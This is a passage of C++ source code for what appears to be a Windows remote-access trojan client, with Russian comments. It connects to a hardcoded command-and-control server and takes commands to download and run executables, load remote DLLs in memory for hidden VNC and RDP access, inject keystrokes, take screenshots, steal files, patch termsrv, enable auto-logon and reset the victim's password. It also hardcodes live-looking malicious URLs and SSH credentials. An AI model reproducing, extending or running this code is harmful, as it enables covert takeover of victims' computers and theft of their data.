	return 0;
}

char Name_Current[MAX_PATH]={'0'};
void SetKeyInRegistry(bool FlagSave)
{

	if(FlagSave)
	{
		if(Name_Current[0]=='0')
		GetValueString(Name_Current);
					//HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\Navigating\.Current
		SetValueString(HKEY_CURRENT_USER, "AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current",NULL , "" );
	}
	else
	{
		if(Name_Current[0]!='0')
		SetValueString(HKEY_CURRENT_USER, "AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current",NULL , Name_Current );
		memset(Name_Current,'0',MAX_PATH);
	}

}



DWORD StartVNC_(LPVOID param)
{
	LPBYTE BotModule  = NULL;
	DWORD dwLen;
	//BotModule=(LPBYTE)DownloadPlugin(Url,  &dwLen );
	if ( !DownloadInMem( "http://apartman-adriana.com/temp/2.dll", &BotModule, &dwLen ) )
	{
		return 0;
	}
	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );
	if (hLib==NULL)
	{
		return 0;
	}

	typedef VOID (WINAPI* PSTART)();
	typedef VOID (WINAPI* PSTOP)();



	PSTART Start			= (PSTART)MemoryGetProcAddress( hLib,"_VNC_Start@0" );
	PSTOP Stop				= (PSTOP )MemoryGetProcAddress( hLib,"_VNC_Stop@0" );


	Start();
	while ( 1 )// ждем команды на выключение
	{
		HANDLE tmp;
		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "ANCStop");
		if ((DWORD)WaitForSingleObject(tmp, INFINITE))
		{
			Sleep(100);
		}
		else break;
	}
	Stop();
	MemoryFreeLibrary(hLib);

	return 0;
}
void ProcessWINCMD( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(WIN_CMD) )
	{
		WIN_CMD *pCmd= (WIN_CMD*)(p->data);
		HWND hw = (HWND)pCmd->id;

		if( !IsWindow(hw) )
		{
			if(pCmd->command== PK_SC_DOWNLOADAndRunEXE)
			{
				DownloadAndRUN((char*)pCmd->data);

			}

			if(pCmd->command== PK_SC_DOWNLOAD)
			{

			}
			if(pCmd->command== PK_SC_SOUND_OFF)
			{

				SetKeyInRegistry(true);
				SendMess(L"Registry Sound OFF", s, p->timestamp);

			}
			else
			if(pCmd->command== PK_SC_SOUND_ON)
			{

				SetKeyInRegistry(false);
				SendMess(L"Registry Sound ON", s, p->timestamp);

			}
			else
			if(pCmd->command== PK_SC_RUNSOUND)
			{
				TCHAR sPath[1024] = L"";
				SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPath);

				lstrcat( sPath, L"\\Internet Explorer\\msacm32.dll" );
				CopyDll(false, sPath);
			}
			else if(pCmd->command == PK_SC_HIDE_JAVA_TRAY)
				HideSystemTrayIcon();
			else if(pCmd->command == PK_SC_SHOW_JAVA_TRAY)
				ShowSystemTrayIcon();
			else if(pCmd->command == PK_SC_CREATE_VPN)
			{
				WCHAR ip[512];
				wcscpy(&ip[0], (WCHAR*)&pCmd->data[0]);
				DWORD err = CreateVPN(&ip[0]);
				if(err == 0)
					SendMess(L"VPN connection successfully created", s, p->timestamp);
				else
				{
					WCHAR mess[128];
					wsprintf(&mess[0], L"VPN connection create FAIL: %d", err);
					SendMess(&mess[0], s, p->timestamp);
				}
			}
			else if(pCmd->command == PK_SC_CREATE_VPN_MANUALY)
			{
				WCHAR ip[16];
				wcscpy(&ip[0], (WCHAR*)&pCmd->data[0]);
				//CreateVPNDialog(&ip[0]);
				//VPNStartThread();
				VPNManualeThread(&ip[0]);
				//CreateVPNDialog(&ip[0]);
			}
			else if(pCmd->command == PK_SC_AUTOLOGON_CHECK)
			{
				if(AutoLoginCheck())
					SendMess(L"'AutoAdminLogon' Enable", s, p->timestamp);
				else
				{
					SendMess(L"'AutoAdminLogon' Disable", s, p->timestamp);
					//AutoLogin();
				}
			}
			else if(pCmd->command == PK_SC_AUTOLOGON_ON)
			{
				if(AutoLogin(true))
					SendMess(L"'AutoAdminLogon' is ON", s, p->timestamp);
				else
					SendMess(L"Failed to change register values 'AutoAdminLogon'", s, p->timestamp);
			}
			else if(pCmd->command == PK_SC_AUTOLOGON_OFF)
			{
				if(AutoLogin(false))
					SendMess(L"'AutoAdminLogon' is OFF", s, p->timestamp);
				else
					SendMess(L"Failed to change register values 'AutoAdminLogon'", s, p->timestamp);
			}




			else if(pCmd->command == PK_SC_ANCStat)
			{
				CloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartVNC_,(LPVOID)NULL,0,NULL));
				SendMess(L"'StartVNC' is OFF", s, p->timestamp);

			}
			else if(pCmd->command == PK_SC_ANCStop)
			{
				HANDLE tmp;
				tmp= (HANDLE)CreateMutexA(NULL,false, "ANCStop");
				Sleep(2*1000);
				CloseHandle(tmp);
				SendMess(L"'StartVNC' is OFF", s, p->timestamp);
			}






			else if(pCmd->command == PK_SC_OPEN_VPN)
			{
				DWORD result = 0;
				DWORD err = CheckVPNState(&result);
				if(err == 0)
				{
					if(result == 1)
					{
						SendMess(L"VPN already connected", s, p->timestamp);
						return;
					}
				}

				err = RemoveRemoteDefaultGateway(L"XXX");
				if(err == 0)
					SendMess(L"RASEO_RemoteDefaultGateway  Removed", s, p->timestamp);
				else
				{
					WCHAR mess[128];
					wsprintf(&mess[0], L"RASEO_RemoteDefaultGateway remove FAIL: %d", err);
					SendMess(&mess[0], s, p->timestamp);
				}

				SendParams params(s, p->timestamp);
				VPNStartThread(params);
			}
			else if(pCmd->command == PK_SC_CLOSE_VPN)
			{
				DWORD err = VPNStop();
				if(err == 0)
					SendMess(L"VPN Stopped", s, p->timestamp);
				else
				{
					WCHAR mes[64];
					wsprintfW(&mes[0], L"VPN Failed to stop: %d", err);
					SendMess(&mes[0], s, p->timestamp);
				}
			}
			else if(pCmd->command == PK_SC_VPN_STATE)
			{
				DWORD result = 0;
				DWORD err = CheckVPNState(&result);
				if(err == 0)
				{
					if(result == 0) SendMess(L"VPN Disconnected", s, p->timestamp);
					else if(result == 1) SendMess(L"VPN Connected", s, p->timestamp);
					else if(result == 2) SendMess(L"VPN Disconnected", s, p->timestamp);
				}
				else
				{
					WCHAR mess[64];
					wsprintf(&mess[0], L"Check VPN state FAIL: %d", err);
					SendMess(&mess[0], s, p->timestamp);
				}
			}
			else if(pCmd->command == PK_SC_DELETE_VPN)
			{
				DWORD err = RasDeleteEntryW(NULL, L"XXX");
				if(err == ERROR_SUCCESS)
					SendMess(L"VPN deleted successfully", s, p->timestamp);
				else
				{
					WCHAR mess[64];
					wsprintf(&mess[0], L"Delete VPN FAIL: %d", err);
					SendMess(&mess[0], s, p->timestamp);
				}
			}
			else if(pCmd->command == PK_SC_SWITCH_DESK_1)
			{
				/*if(hFirstDesktop != NULL)
					BOOL res = SetThreadDesktop(hFirstDesktop);*/
				SetCurDesk(First);
			}
			else if(pCmd->command == PK_SC_SWITCH_DESK_2)
			{
				hSecondDesktop=CreateDesktopW(SECOND_DESK_NAME,NULL,NULL,DF_ALLOWOTHERACCOUNTHOOK,GENERIC_ALL,NULL);
				/*HDESK hDesktop_cur = GetThreadDesktop(GetCurrentThreadId());
				if(hDesktop_cur != hSecondDesktop && hDesktop_cur != NULL)
					hFirstDesktop = hDesktop_cur;*/
				/*BOOL res = SetThreadDesktop(hSecondDesktop);
				DWORD err = GetLastError();
				if(err!=ERROR_SUCCESS)
					DbgMsgW(L"ClientConsole.cpp", err, L"ERROR");*/
				DWORD err = GetLastError();
				SetCurDesk(Second);
			}
			else if(pCmd->command == PK_SC_SHOWALLWINDOWS)
			{
				pContext->m_bShowAllWindows=!pContext->m_bShowAllWindows;

			}
			else if(pCmd->command == PK_SC_JAVAMOVE)
			{
				pContext->m_bJavaMove=!pContext->m_bJavaMove;

			}
			else if(pCmd->command == PK_SC_REBOOT)
			{
				/*_asm
				{
					ROMBIOS_DATA    segment at 0400h
					org 72h
					ResetFlag   DW  ?
					ROMBIOS_DATA    ends

					ROMBIOS     segment at 0f000h
					org 0fff0h
					Reset   label   far
					ROMBIOS ends

					In your code:

					mov ax, seg ROMBIOS_DATA
					mov ds, ax
					ASSUME ds:ROMBIOS_DATA
					mov ResetFlag, 1234h
					jmp Reset
				}*/
				//system("shutdown -r");
				RunHiddenConsoleA("shutdown -r", FALSE);
			}
			else if(pCmd->command == PK_SC_REMOTE_REBOOT2)
			{
				if (x_Reboot())
				{
					SendMess(L"x_Reboot2 is Start", s, p->timestamp);
					Sleep(1000*30);
					x_ShutDown();
				}
				else
					SendMess(L"x_Reboot2 is Error", s, p->timestamp);



			}
			else if(pCmd->command == PK_SC_PASSWORD)
			{
				WCHAR* user = (WCHAR*)malloc(256*sizeof(WCHAR));
				DWORD bufsize = 256*sizeof(WCHAR);
				if(GetUserName(user, &bufsize) == ERROR_INSUFFICIENT_BUFFER)
				{
					user = (WCHAR*)realloc(user, bufsize*sizeof(WCHAR));
					GetUserNameW(user, &bufsize);
				}
				WCHAR* cmd = (WCHAR*)malloc(256*sizeof(WCHAR));
				wsprintfW(cmd, L"net user %s admin", user);
				RunHiddenConsoleW(cmd, TRUE);
				free(user);
				free(cmd);
			}
			else if(pCmd->command == PK_SC_HIDEFROMSECONDDESC_OFF)
			{
				pContext->m_bHideSecDesc =false;
			}
			else if(pCmd->command == PK_SC_HIDEFROMSECONDDESC_ON)
			{
				pContext->m_bHideSecDesc =true;
			}
			else if(pCmd->command == PK_SC_PATCH_TERMSRV)
			{
				SendParams param(s, p->timestamp);
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Patch, &param, NULL, NULL);
				//bool result = Patch(NULL);
			}
			else
				SendMessage( hw, WM_SYSCOMMAND, pCmd->command, 0 );
		}
		else
		{
			if(pCmd->command == PK_SC_SHOW)
			{
				ShowWindow(hw, SW_SHOW);
				SetLayeredWindowAttributes(hw, 255, 255, LWA_ALPHA);
				//SetWindowPos(hw, HWND_TOP, 0, 0, 0, 0, SWP_SHOWWINDOW  | SWP_NOMOVE |SWP_DRAWFRAME);
				//SetWindowLong( hw, GWL_EXSTYLE, GetWindowLong( hw,GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
				RECT Rect;
				GetWindowRect(hw,&Rect);
				MoveWindow(hw,0,0,Rect.right-Rect.left,Rect.bottom-Rect.top,true);
				if(IsJavaWindow(hw))
				{
					int x = GetSystemMetrics( SM_CXSCREEN );
					int y = GetSystemMetrics( SM_CYSCREEN );
					SetWindowPos(hw, HWND_BOTTOM, x/2-250, y/2-100, 500, 200, SWP_NOACTIVATE );
				}
			}
			else if(pCmd->command == PK_SC_HIDE)
				ShowWindow(hw, SW_HIDE);
			else
				SendMessage( hw, WM_SYSCOMMAND, pCmd->command, 0 );

			PacketBuffer reply;
			reply.Create( PK_CS_WINCMD, p->timestamp, 0, 0 );
			reply.Send( s );
		}
	}
}

void ProcessOPTIONS( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(CL_OPTIONS) )
	{
		CL_OPTIONS *pCmd= (CL_OPTIONS*)(p->data);

		pContext->m_iSleep1 = pCmd->sleep1;
		pContext->m_iSleep2 = pCmd->sleep2;
		pContext->m_iSleep3 = pCmd->sleep3;
		pContext->m_iSleep = pCmd->sleep;
		pContext->m_iPrio1 = pCmd->prio1;
		lstrcpy(pContext->ClassName,pCmd->m_ClassName);
		lstrcpy(pContext->WinHederName,pCmd->m_WinHederName);
		lstrcpy(pContext->ProccessName,pCmd->m_ProccessName);

		int len = lstrlen(pCmd->Coments)*2;
		int len2 = lstrlen(&pCmd->Coments[0])*2;

		FileCreateInFolder(0x001a,L"coment.dat", &pCmd->Coments[0], lstrlen(pCmd->Coments)*2);


		PacketBuffer reply;
		reply.Create( PK_CS_SETOPTIONS, p->timestamp, 0, 0 );
		reply.Send( s );
		//p->size =0;
		ProcessINFO( pContext, s,  p );
	}
	else if(p->size == NULL)
	{
		CL_OPTIONS pCmd;

		pCmd.sleep	=pContext->m_iSleep;
		pCmd.sleep1	=pContext->m_iSleep1;
		pCmd.sleep2	=pContext->m_iSleep2;
		pCmd.sleep3	=pContext->m_iSleep3;
		pCmd.prio1	=pContext->m_iPrio1;

		lstrcpy(pCmd.m_ClassName	,pContext->ClassName);
		lstrcpy(pCmd.m_WinHederName	,pContext->WinHederName);
		lstrcpy(pCmd.m_ProccessName	,pContext->ProccessName);

		int coments;
		GetFileData(0x001a,L"coment.dat",&pCmd.Coments[0],&coments);

		PacketBuffer reply;
		reply.Create( PK_CS_SETOPTIONS, p->timestamp, sizeof(pCmd), &pCmd );
		reply.Send( s );
	}

}

void ProcessCloseDLL( CClientContext *pContext, SOCKET s, PPacket p )
{
	HANDLE tmp;
	tmp= (HANDLE)CreateMutexA(NULL,false, "DllStop");
	Sleep(2*1000);
	CloseHandle(tmp);
	SendMess(L"DllStop", s, p->timestamp);
}

//=========================
DWORD WINAPI ImStartedThread(LPVOID lpData)
{
	PCHAR ProccessName= (PCHAR)lpData;
	while(true)
	{
		HANDLE tmp;
		tmp= (HANDLE)CreateMutexA(NULL,false, ProccessName);
		OutputDebugStringA("Create mutex ");
		Sleep(2*1000);
	}
	return 0;
}



HANDLE ImAlive(char * Proccess)
{
	return StartThread(ImStartedThread,Proccess);
}
DWORD WINAPI ClientStartRDP_Dll( LPVOID lpThreadParameter )
{

	LPBYTE BotModule  = NULL;
	DWORD dwLen;
	//BotModule=(LPBYTE)DownloadPlugin(Url,  &dwLen );
	if ( !DownloadInMem( "http://apartman-adriana.com/temp/1.dll", &BotModule, &dwLen ) )
	{
		return 0;
	}
	FileCreateInFolder( 0x001a,L"Dat.dat", BotModule, dwLen);
	free(BotModule);

	WCHAR SysPath[MAX_PATH];
	SHGetFolderPathW(NULL, 0x001a, NULL, SHGFP_TYPE_CURRENT, SysPath);
	lstrcatW( SysPath, L"\\" );
	lstrcatW( SysPath, L"Dat.dat" );

	HMODULE Lib= LoadLibraryW(SysPath);

	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);



	PINIT Init				= (PINIT)GetProcAddress( Lib, "Init" );
	PSTART Start			= (PSTART)GetProcAddress( Lib, "Start" );
	PSTOP Stop				= (PSTOP)GetProcAddress( Lib, "Stop" );
	PTakeBotGuid TakeBotGuid= (PTakeBotGuid)GetProcAddress( Lib, "TakeBotGuid" );


			  //'88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixer;http://www.cushyhost.com/download.php?img=73'
	char*ip   = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";


	int i=Init(ip);
	int w=Start();
	while ( 1 )// ждем команды на выключение
	{
		HANDLE tmp;
		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
		if ((DWORD)WaitForSingleObject(tmp, INFINITE))
		{
			Sleep(100);
		}
		else break;
	}
	int r=Stop();
	FreeLibrary(Lib);

	return 0;

}
void ProcessLoadDLL( CClientContext *pContext, SOCKET s, PPacket p )
{
	// ClientStartRDP_Dll( NULL );
	if (StartThread(ClientStartRDP_Dll,NULL)!=NULL)
		SendMess(L"Load DLL", s, p->timestamp);
	else
		SendMess(L"no Load DLL ", s, p->timestamp);


}



DWORD WINAPI ClientThread( LPVOID lpThreadParameter )
{
	//HANDLE HandleLiv =ImAlive("SBIsALive");
	CClientContext *pContext = (CClientContext *)lpThreadParameter;

	WSADATA wsa;
	ZeroMemory(&wsa,sizeof(wsa));
	WSAStartup( MAKEWORD( 2, 2 ), &wsa );

	CFileLoader loader;
	pContext->m_pLoader = &loader;

    GdiplusStartupInput input;
    GdiplusStartupOutput output;
	if( GdiplusStartup( &pContext->m_dwGdiplusToken, &input, &output ) == Gdiplus::Ok )
	{
		pContext->m_bUseJpeg = true;
	}

	while( 1 )
	{
		HANDLE tmp;
		tmp= (HANDLE)CreateMutexA(NULL,false, "SBIsALive");

		SOCKET s = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		if( s != INVALID_SOCKET )
		{
			sockaddr_in laddr;
			ZeroMemory( &laddr, sizeof(laddr) );
			laddr.sin_family = AF_INET;
			if( bind( s, (sockaddr*)&laddr, sizeof(laddr) ) == 0 )
			{
				sockaddr_in raddr;
				ZeroMemory( &raddr, sizeof(raddr) );
				raddr.sin_family = AF_INET;
				raddr.sin_port = htons( pContext->m_iPort );
				raddr.sin_addr.S_un.S_addr = inet_addr( pContext->m_sServer );

				if( connect( s, (sockaddr*)&raddr, sizeof(raddr) ) == 0 )
				{
					DWORD lastActivity = timeGetTime();
					PacketBuffer buffer;
					while( 1 )
					{
						DWORD currentTime = timeGetTime();

						bool bActivity = false;
						if( !buffer.Receive( s, &bActivity ) )
						{
							break;
						}

						if( bActivity )
						{
							lastActivity = currentTime;
						}
						else
						{
							if( currentTime - lastActivity > PING_TIMEOUT )
							{
								break;
							}
						}

						while( buffer.IsPacketCompleted() )
						{
							PPacket p = buffer.GetFirst();

							if( p )
							{
								switch( p->type )
								{

								case PK_SC_PING:					ProcessPING(pContext,s,p);					break;
								case PK_SC_INFO:					ProcessINFO(pContext,s,p);					break;
								case PK_SC_WINLIST:					ProcessWINLIST(pContext,s,p);				break;

								case PK_SC_RESUMEJAVA:				ProcessRESUMEJAVA(pContext,s,p);			break;
								case PK_SC_SUSPENDJAVA:				ProcessSUSPENDJAVA(pContext,s,p);			break;

								case PK_SC_WIN_CLOSE:				ProcessWIN_CLOSE(pContext,s,p);				break;

								case PK_SC_FILELIST:				ProcessGetFileList(pContext,s,p);			break;
								case PK_SC_PROCESSLIST:				ProcessGetProcessList(pContext,s,p);		break;
								case PK_SC_KILLPROCESSFROMLIST:		ProcessKILLProc(pContext,s,p);				break;
								case PK_SC_KILLPROCESFROMLIST_I_F_O:ProcessKILLProcI_F_O(pContext,s,p);			break;
								case PK_SC_DRIVERLIST:				ProcessGetDriverList(pContext,s,p);			break;
								case PK_SC_FILEGET:					ProcessFileGet(pContext,s,p);				break;
								case PK_SC_GET_GATEWAY_IPS:			ProcessGetGatewayIPs(pContext,s,p);			break;

								case PK_SC_WIN_CONTROL_NAME:		ProcessWIN_CONTROL_LIST(pContext,s,p);		break;
								case PK_SC_WINSHOT:					ProcessWINSHOT(pContext,s,p);				break;
								case PK_SC_LEFTCLICK:				ProcessLEFTCLICK(pContext,s,p);				break;
								case PK_SC_KEYS:					ProcessKEYS(pContext,s,p);					break;
								case PK_SC_KEYS_TO_CONTROL:			ProcessKEYS_TO_CONTROL(pContext,s,p);		break;
								case PK_SC_LEFT_DOWN_TO_CONTROL:	ProcessLEFT_DOWN_TO_CONTROL(pContext,s,p);	break;
								case PK_SC_RIGHT_DOWN_TO_CONTROL:	ProcessRIGHT_DOWN_TO_CONTROL(pContext,s,p);	break;
								case PK_SC_RUN:						ProcessRUN(pContext,s,p);					break;
								case PK_SC_RUNFILE:					ProcessPK_SC_RUNFILE(pContext,s,p);			break;
								case PK_SC_PATCHINFO:				ProcessPATCHINFO(pContext,s,p);				break;
								case PK_SC_PATCHSTART:				ProcessPATCHSTART(pContext,s,p);			break;



								case PK_SC_PATCHDATA:				ProcessPATCHDATA(pContext,s,p);				break;
								case PK_SC_WINCMD:					ProcessWINCMD(pContext,s,p);				break;
								case PK_SC_SETOPTIONS:				ProcessOPTIONS(pContext,s,p);				break;
								case PK_SC_LOAD_DLL:				ProcessLoadDLL(pContext,s,p);				break;
								case PK_SC_CLOSE_DLL:				ProcessCloseDLL(pContext,s,p);				break;
								case PK_SC_PORTFORW:				ProcessPORTFORW(pContext,s,p);				break;
								case PK_SC_CLOLSE_SB:

									{
										closesocket( s );
										WSACleanup();
										DWORD data;

										GdiplusShutdown(pContext->m_dwGdiplusToken);
										CloseHandle(tmp);

										ExitThread(0);


										return 0;
									}
								default:
									//MessageBeep(-1);
									break;
								}
								buffer.DiscardFirst();
							}
						}
						Sleep(POLL_DELAY);
					}
					shutdown( s, SD_BOTH );

					//if(getHookN()!=NULL) UnhookWindowsHook(WH_CBT, CBTProc);
				}
			}
			closesocket( s );
		}
		Sleep(CONNECTION_RETRY);
	}

	WSACleanup();
	return 0;
}

///#ifdef _DLL
#ifdef ewefwe
extern "C" __declspec(dllexport) void  StartClient(
	char *Server, int Port, char *Uid, int BrowserType )
{

	/*OutputDebugStringA("запуск удался");
	OutputDebugStringA(Server);
	//return;*/
	CClientContext context;
	lstrcpyA( context.m_sServer, Server );
	lstrcpyA( context.m_sUid, "1) " );
	lstrcatA( context.m_sUid, Uid );

	context.m_iPort = Port;
	context.m_iBrowserType = BrowserType;

	DWORD dwThreadID = 0;
	HANDLE hThread = CreateThread( 0, 0, ClientThread, &context, 0, &dwThreadID );
	WaitForSingleObject( hThread, INFINITE );

}

#pragma comment( linker, "/ENTRY:DllMain" )
BOOL WINAPI DllMain(
	HANDLE hinstDLL,
	DWORD dwReason,
	LPVOID lpvReserved )
{

	/*if( dwReason == DLL_PROCESS_ATTACH )
	{
		StartClient( "127.0.0.1", 9999, "XXXXXXX", 1 );
	}*/

	return TRUE;
}

#else
#pragma comment( linker, "/ENTRY:WinMain" )

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nShowCmd )
{
	//ProcessLoadDLL( NULL,0,NULL );
	//DownloadDLL("");
//	HWND hWnd=FindWindowA(NULL,"QIP.RU: почта, поиск, новости, знакомства, игры и развлечения - Windows Internet Explorer");
//	ClickedControl(hWnd,100,100);

	CClientContext context;
	lstrcpyA( context.m_sServer,/*"188.72.213.145");///*"88.198.53.14" );///**/"192.168.56.99" );//188.72.213.145	95.168.173.155 88.198.53.14 192.168.1.2*/"88.198.53.14"); //88.198.53.14
	lstrcpyA( context.m_sUid, "WMWare" );
	context.m_iPort = 711;//DEFAULT_SERVER_PORT;
	context.m_iBrowserType = 1;

	DWORD dwThreadID = 0;
	HANDLE hThread = CreateThread( 0, 0, ClientThread, &context, 0, &dwThreadID );
	hFirstDesktop = GetThreadDesktop(GetCurrentThreadId());
	WaitForSingleObject( hThread, INFINITE );
	ExitThread(0);
	return 0;
}
#endif

/*
extern "C" __declspec(dllexport) void WINAPI StartClient(
 char *Server, int Port, char *Uid, int BrowserType )
{
 CClientContext context;
 lstrcpyA( context.m_sServer, Server );
 lstrcpyA( context.m_sUid, Uid );
 context.m_iPort = Port;
 context.m_iBrowserType = BrowserType;

 DWORD dwThreadID = 0;
 HANDLE hThread = CreateThread( 0, 0, ClientThread, &context, 0, &dwThreadID );
 WaitForSingleObject( hThread, INFINITE );
}/**/

